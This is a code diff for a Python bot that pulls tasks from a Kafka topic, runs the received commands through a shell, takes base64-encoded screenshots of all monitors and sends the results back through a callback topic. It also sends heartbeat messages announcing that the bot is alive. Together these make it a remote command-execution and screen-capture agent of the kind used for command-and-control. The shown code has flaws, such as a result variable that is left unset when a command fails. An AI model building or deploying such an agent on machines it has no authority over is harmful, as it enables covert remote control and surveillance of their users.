@@ -1,3 +1,4 @@
+from io import BytesIO
 import platform
 import time
 from kafka_producer import produce_message
@@ -6,56 +7,64 @@ import subprocess
 import uuid
 import schedule
 from mss import mss
-from PIL import Image
+from PIL import Image, ImageGrab
+import base64
 
+
+"""This script is a Kafka consumer that listens for tasks, executes them, and produces callback messages with the results.
+It also sends heartbeat messages to indicate that the bot is alive.
+"""
 def handle_callback(task, group_id):
     """ Handle the callback logic based on the consumed message. """
     print(f'Received order {task}')
-    if task['actionType'] == 'exec_script' or task['actionType'] == 'os_exec_script':
-        print(f'Received script execution order, proceeding to execute it')
-        # Execute the task
-        script_value = task['parameters']['value']
-        try:
-            # Execute the script
-            if task['actionType'] == 'exec_script':
-                # For exec_script, use subprocess.run
-                result = subprocess.run(script_value, shell=True, check=True, text=True, capture_output=True)
+    print(f'Received script execution order, proceeding to execute it')
+    # Execute the task
+    try:
+        # Execute the script
+        if task['actionType'] == 'exec_script':
+            # For exec_script, use subprocess.run
+            result_str = ""
+            for command in task['parameters']['value'].split("\n"):
+                result = subprocess.run(command, shell=True, check=True, text=True, capture_output=True)
                 print(f'Script output: {result.stdout}')
-                result_str = result.stdout
-            elif task['actionType'] == 'screenshot':
-                # For creates an screenshot, use the system command and sends in base64 format
-                result_str = shot_screenshot()
-                print(f'Screenshot output: {result_str}')
-            else:
-                result = script_value.system(script_value)
-                print(f'Script output: {result.stdout}')
-                result_str = result.stdout
-        except subprocess.CalledProcessError as e:
-            print(f'Script execution failed: {e.stderr}')
-            result = e.stderr
-            
-        # Produce a callback message
-        callback_task = {
-            'actionType': 'callback',
-            'parameters': {
-                'groupId': group_id,
-                'taskId': task['id']
-            },
-            'result': result_str
-        }
-        produce_message(bootstrap_servers, 'callback', callback_task)
+                result_str += "\n" + result.stdout
+        elif task['actionType'] == 'screenshot':
+            # For creates an screenshot, use the system command and sends in base64 format
+            result_str = shot_screenshot()
+            print(f'Screenshot created successfully, size: {len(result_str)} bytes')
+    except subprocess.CalledProcessError as e:
+        print(f'Script execution failed: {e.stderr}')
+        result = e.stderr
+        
+    # Produce a callback message
+    callback_task = {
+        'actionType': 'callback',
+        'parameters': {
+            'groupId': group_id,
+            'taskId': task['id']
+        },
+        'result': result_str
+    }
+    produce_message(bootstrap_servers, 'callback', callback_task)
 
 def shot_screenshot():
     """ Take a screenshot and return the image in base64 format. """
     try:
         with mss() as sct:
-            # Capture the screenshot
-            sct_img = sct.grab(sct.monitors[0])  # monitors[0] represents all monitors combined
+            # Capture all monitors
+            monitor = sct.monitors[0]
+            sct_img = ImageGrab.grab(all_screens=True)
             
-            # Convert to PIL Image
-            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
+            # Store the image transformed to base64
+            # Save the image to a BytesIO object
+            buffered = BytesIO()
+            sct_img.save(buffered, format="PNG")
 
-            return img
+            # Encode the image to base64
+            img_str = base64.b64encode(buffered.getvalue()).decode('utf-8')
+            
+        # Return the image object
+        return img_str
     except Exception as e:
         print(f"Error taking screenshot: {e}")
         return str(e)
